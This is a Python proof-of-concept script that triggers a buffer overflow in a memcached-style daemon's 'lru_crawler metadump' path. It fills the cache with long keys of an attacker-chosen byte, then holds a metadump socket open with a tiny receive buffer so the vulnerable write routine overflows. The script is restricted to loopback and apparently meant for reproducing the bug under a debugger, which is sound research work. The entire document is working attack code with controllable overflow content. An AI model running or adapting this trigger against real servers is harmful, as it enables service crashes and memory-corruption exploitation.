#!/usr/bin/env python3
"""Loopback-only trigger for the lru_crawler metadump idle-client overflow.

Phase 1 stores many long keys whose bytes are all CHOSEN (default 'Z'=0x5a).
Phase 2 issues `lru_crawler metadump all` on a fresh socket, then never reads;
a tiny SO_RCVBUF makes the daemon's POLLOUT wait time out quickly, which is the
false-success path in the pinned vulnerable lru_crawler_write().

No external address is contacted; HOST is fixed to 127.0.0.1.
"""
import socket
import sys
import time

HOST = "127.0.0.1"
PORT = int(sys.argv[1])
N = int(sys.argv[2]) if len(sys.argv) > 2 else 8000
KEYBYTE = bytes([int(sys.argv[3], 0)]) if len(sys.argv) > 3 else b"Z"
KEEP = int(sys.argv[4]) if len(sys.argv) > 4 else 40
KEYLEN = 240


def connect():
    """Retry the loopback connect while a debugger finishes starting the daemon."""
    deadline = time.monotonic() + 60
    last = None
    while time.monotonic() < deadline:
        try:
            return socket.create_connection((HOST, PORT), timeout=5)
        except OSError as exc:
            last = exc
            time.sleep(0.2)
    raise SystemExit("daemon never listened on %s:%d: %s" % (HOST, PORT, last))


def store_items():
    s = connect()
    f = s.makefile("rb")
    prefix = KEYBYTE * KEYLEN
    for i in range(N):
        k = prefix + (b"%05d" % i)  # 245 bytes, under the 250-byte key cap
        s.sendall(b"set " + k + b" 0 0 1\r\nx\r\n")
        resp = f.readline()
        if resp != b"STORED\r\n":
            raise SystemExit("store failed at %d: %r" % (i, resp))
    f.close()
    s.close()
    print("stored %d keys of byte %r" % (N, KEYBYTE), flush=True)


def trigger():
    c = connect()
    c.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4096)
    c.sendall(b"lru_crawler metadump all\r\n")
    print("metadump issued; holding socket open %ds without reading" % KEEP,
          flush=True)
    time.sleep(KEEP)
    c.close()


if __name__ == "__main__":
    store_items()
    trigger()
